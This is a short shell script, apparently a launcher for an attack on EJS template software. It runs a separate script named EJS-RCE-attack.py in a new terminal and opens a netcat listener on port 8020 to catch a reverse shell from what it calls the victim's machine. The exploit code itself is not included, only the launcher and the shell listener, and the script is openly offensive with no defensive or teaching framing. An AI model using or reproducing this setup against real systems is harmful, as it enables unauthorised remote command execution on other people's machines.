echo "Attempting to open shell from victim's machine..."
gnome-terminal -- python3 EJS-RCE-attack.py
# Change 8020 to desired port
nc -lvp 8020